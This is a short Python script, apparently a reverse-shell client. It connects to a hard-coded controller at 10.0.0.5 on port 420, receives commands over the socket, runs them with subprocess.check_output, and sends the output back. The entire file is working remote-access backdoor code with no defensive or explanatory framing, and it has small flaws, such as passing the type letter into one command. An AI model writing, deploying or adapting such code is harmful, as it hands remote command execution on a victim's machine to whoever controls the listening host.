import socket as s
import threading
from subprocess import check_output

HOST = "10.0.0.5"
PORT = 420
BUFFER = 1024
FORMAT = "utf-8"
ADDR = (HOST, PORT)

client = s.socket(s.AF_INET, s.SOCK_STREAM)
client.connect(ADDR)


def sendMsg(msg):
	sendLength = str(len(msg)).encode(FORMAT)

	client.send(sendLength)

	client.send(msg.encode(FORMAT))
	recvMsg()


def process(message):
	ctype = message[0]
	messageLst = message.split(" ")

	if ctype == "p":
		check_output(messageLst).decode("cp850")
		recvMsg()
	elif ctype == "c":
		messageLst.pop(0)
		comm = check_output(messageLst).decode("cp850")
		sendMsg(comm)

	elif ctype == "f":
		pass
	else:
		sendMsg("!type")


def recvMsg():
	msgLen = int(client.recv(BUFFER).decode(FORMAT))

	if msgLen:
		msg = client.recv(int(msgLen)).decode(FORMAT)
		process(msg)


recvMsg()
